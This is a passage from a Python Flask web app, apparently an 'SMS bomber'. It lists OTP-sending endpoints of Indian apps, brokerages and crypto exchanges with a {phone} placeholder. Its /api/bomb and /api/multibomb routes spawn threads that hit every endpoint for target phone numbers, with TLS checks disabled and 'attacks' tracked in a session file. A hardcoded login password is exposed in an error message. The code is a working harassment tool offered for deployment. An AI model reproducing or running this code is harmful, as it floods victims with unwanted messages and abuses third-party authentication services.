    {"name": "AstroSage", "url": "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"query":"query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success } }","variables":{"mobile_no":"{phone}","resend":0}}'},
    {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","isd_code":"91"}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","appSource":"CHARZER_APP"}'},
    {"name": "Nuvama Wealth", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNo":"{phone}","emailID":"test@example.com"}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Cred", "url": "https://api.cred.club/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "Groww", "url": "https://api.groww.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Zerodha", "url": "https://kite.zerodha.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Upstox", "url": "https://api.upstox.com/v2/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Angel One", "url": "https://www.angelone.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "5paisa", "url": "https://www.5paisa.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"MobileNo":"{phone}"}'},
    {"name": "Paytm Money", "url": "https://api.paytmmoney.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "CoinSwitch", "url": "https://api.coinswitch.co/v2/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
    {"name": "CoinDCX", "url": "https://api.coindcx.com/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "WazirX", "url": "https://api.wazirx.com/sapi/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Binance", "url": "https://api.binance.com/sapi/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "KuCoin", "url": "https://api.kucoin.com/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "Bybit", "url": "https://api.bybit.com/v5/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
    {"name": "OKX", "url": "https://www.okx.com/api/v5/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
]

# Session storage (Railway compatible)
SESSIONS_FILE = '/tmp/sessions.json'

def load_sessions():
    if os.path.exists(SESSIONS_FILE):
        try:
            with open(SESSIONS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_sessions(sessions):
    try:
        with open(SESSIONS_FILE, 'w') as f:
            json.dump(sessions, f)
    except Exception as e:
        print(f"Save error: {e}")

def send_request(api, phone):
    try:
        url = api['url'].replace('{phone}', phone)
        headers = api['headers'].copy()
        headers['User-Agent'] = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        
        # Session create karo with retries
        session = requests.Session()
        retry_strategy = Retry(
            total=1,
            backoff_factor=0.1
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        if api['method'] == 'POST' and api.get('data'):
            data = api['data'].replace('{phone}', phone)
            response = session.post(url, headers=headers, data=data, timeout=5, verify=False)
        else:
            response = session.get(url, headers=headers, timeout=5, verify=False)
        
        return response.status_code
    except Exception as e:
        print(f"Error: {e}")
        return 0

# ============ ROUTES ============

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect('/login')
    return render_template('index.html', username=session.get('username', 'User'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        if password == 'aniket':
            session['logged_in'] = True
            session['username'] = username if username else 'User'
            return redirect('/')
        else:
            return render_template('login.html', error='❌ Wrong password! Password is: aniket')
    
    return render_template('login.html', error=None)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/api/stats')
def api_stats():
    sessions = load_sessions()
    total_hits = sum(s.get('hits', 0) for s in sessions.values())
    return jsonify({
        'status': 'success',
        'totalApis': len(ULTIMATE_APIS),
        'activeAttacks': len(sessions),
        'totalHits': total_hits
    })

@app.route('/api/bomb', methods=['POST'])
def api_bomb():
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    
    data = request.get_json()
    if not data:
        return jsonify({'status': 'error', 'message': 'No data received'}), 400
    
    phone = data.get('phone', '')
    
    if not phone or not phone.isdigit() or len(phone) != 10:
        return jsonify({'status': 'error', 'message': 'Invalid phone number'})
    
    sessions = load_sessions()
    session_id = f"attack_{int(time.time())}_{random.randint(1000,9999)}"
    
    sessions[session_id] = {
        'phone': phone,
        'hits': 0,
        'start_time': time.time()
    }
    
    def attack():
        hits = 0
        for api in ULTIMATE_APIS:
            status = send_request(api, phone)
            if 200 <= status < 300:
                hits += 1
            time.sleep(0.01)
        
        sessions = load_sessions()
        if session_id in sessions:
            sessions[session_id]['hits'] = hits
            save_sessions(sessions)
    
    Thread(target=attack).start()
    save_sessions(sessions)
    
    return jsonify({'status': 'success', 'session_id': session_id})

@app.route('/api/multibomb', methods=['POST'])
def api_multibomb():
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    
    data = request.get_json()
    if not data:
        return jsonify({'status': 'error', 'message': 'No data received'}), 400
    
    phones_str = data.get('phones', '')
    phones = [p.strip() for p in phones_str.split(',')]
    
    sessions = load_sessions()
    started = 0
    
    for phone in phones:
        if phone.isdigit() and len(phone) == 10:
            session_id = f"multi_{int(time.time())}_{random.randint(1000,9999)}"
            sessions[session_id] = {
                'phone': phone,
                'hits': 0,
                'start_time': time.time()
            }
            
            def attack(p, sid):
                hits = 0
                for api in ULTIMATE_APIS:
                    status = send_request(api, p)
                    if 200 <= status < 300:
                        hits += 1
                    time.sleep(0.005)
                
                sessions = load_sessions()
                if sid in sessions:
                    sessions[sid]['hits'] = hits
                    save_sessions(sessions)
            
            Thread(target=attack, args=(phone, session_id)).start()
            started += 1
            time.sleep(0.5)
    
    save_sessions(sessions)
    return jsonify({'status': 'success', 'count': started})

@app.route('/api/stopall', methods=['POST'])
def api_stopall():
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    
    save_sessions({})
    return jsonify({'status': 'success', 'message': 'All attacks stopped'})

@app.route('/api/status')
def api_status():
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    
    sessions = load_sessions()
    attacks = []
    for sid, s in sessions.items():
        attacks.append({
            'phone': s['phone'],
            'hits': s['hits'],
            'time': int(time.time() - s['start_time'])
        })
    
    return jsonify({
        'status': 'success',
        'activeAttacks': len(sessions),
        'attacks': attacks,
        'totalHits': sum(s.get('hits', 0) for s in sessions.values())
    })

# For Railway - required
app.debug = False

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
